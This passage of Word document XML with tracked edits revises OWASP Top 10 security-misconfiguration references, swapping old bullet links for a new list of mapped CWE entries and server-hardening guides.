            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>### External</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="74FFF530"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47" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EF436F3" w14:textId="1A6E2F32" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="003E073E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2148" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2149" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [NIST Guide to General Server </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Hardening](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://csrc.nist.gov/publications/detail/sp/800-123/final)</w:t>
      </w:r>
      <w:ins w:id="2150" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="10155547"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51" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2152" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* [CWE-2: Environmental Security Flaws](https://cwe.mitre.org/data/definitions/2.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1D753C8B"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53" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2154" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* [CWE-16: Configuration](https://cwe.mitre.org/data/definitions/16.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="35A0595E" w14:textId="77777777" w:rsidR="003E073E" w:rsidRPr="003E073E" w:rsidRDefault="003E073E" w:rsidP="0024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55" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2156" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* [CWE-388: Error Handling](https://cwe.mitre.org/data/definitions/388.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="79ED087A" w14:textId="63913FD1" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="003E073E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2157" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2158" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [CIS Security Configuration Guides/</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Benchmarks](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://www.cisecurity.org/cis-benchmarks/)</w:t>
      </w:r>
      <w:ins w:id="2159" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">  -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="156B286F" w14:textId="564A1881" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="003E073E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2160" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* [</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2161" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Amazon S3 Bucket Discovery and </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Enumeration](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://blog.websecurify.com/2017/10/aws-s3-bucket-discovery.html)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFAE465" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="739AF60F" w14:textId="77777777" w:rsidR="003E073E" w:rsidRDefault="003E073E" w:rsidP="0024421C">
      <w:pPr>
        <w:pStyle w:val="HTMLVorformatiert"/>
        <w:rPr>
          <w:del w:id="2162" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2163" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A4:2017 XML External Entities (XXE)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1ADE9E8E" w14:textId="77777777" w:rsidR="005C43E9" w:rsidRPr="005C43E9" w:rsidRDefault="005C43E9" w:rsidP="0024421C">
      <w:pPr>
        <w:pStyle w:val="HTMLVorformatiert"/>
        <w:rPr>
          <w:del w:id="2164" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2165" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### External</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="69755FDC" w14:textId="77777777" w:rsidR="005C43E9" w:rsidRPr="005C43E9" w:rsidRDefault="005C43E9" w:rsidP="0024421C">
      <w:pPr>
        <w:pStyle w:val="HTMLVorformatiert"/>
        <w:rPr>
          <w:del w:id="2166" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1618C7C4" w14:textId="56EB768D" w:rsidR="00841D1E" w:rsidRDefault="005C43E9" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2167" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2168" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2169" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## List of Mapped CWEs </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4FB47235" w14:textId="77777777" w:rsidR="00B74248" w:rsidRPr="00841D1E" w:rsidRDefault="00B74248" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2170" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="588E4A72" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2171" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2172" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-2: 7PK - </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Environment](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/2.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="65CAE688" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2173" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2174" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-11: ASP.NET Misconfiguration: Creating Debug </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Binary](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/11.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="33FAD78F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2175" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2176" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-13: ASP.NET Misconfiguration: Password in Configuration </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>File](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/13.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="392C4EDC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2177" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2178" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-15: External Control of System or Configuration </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Setting](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/15.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="73DA1374" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2179" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2180" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-16: </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Configuration](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/16.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="10293890" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2181" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2182" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-260: Password in Configuration </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>File](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/260.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="186BA3B0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2183" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2184" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">- [CWE-315: Cleartext Storage of Sensitive Information in a </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Cookie](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/315.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="74735354" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2185" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2186" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-520: .NET Misconfiguration: Use of </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Impersonation](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/520.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0750A6CB" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2187" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2188" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-526: Exposure of Sensitive Information Through Environmental </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Variables](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/526.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3C1B752A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2189" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2190" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-537: Java Runtime Error Message Containing Sensitive </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
